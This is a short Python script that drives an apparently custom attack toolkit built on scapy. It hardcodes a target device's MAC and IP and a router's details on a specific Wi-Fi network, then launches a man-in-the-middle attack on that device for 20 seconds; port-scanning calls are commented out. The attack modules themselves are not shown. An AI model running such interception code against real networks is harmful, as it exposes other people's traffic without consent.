from interface import Interface
from scanner import Scanner
from router import Router
from mitm import Mitm
from device import Device

import requests
import scapy.all as scapy
from scapy.layers import http
from scapy.layers.dns import DNSRR, DNS, DNSQR
import time
import re

wlan0 = Interface("wlan0")
target = Device("be:39:2e:b1:eb:85", "192.168.14.84")
router = Router("14:ae:db:a3:22:95", 6,"BezeqNK","192.168.14.1")

#scanner = Scanner(wlan0)
#scanner.run()
#scanner.scan_open_ports(target)

mitm = Mitm(wlan0, router)
mitm.start_mitm(target)
time.sleep(20)
mitm.stop()


    

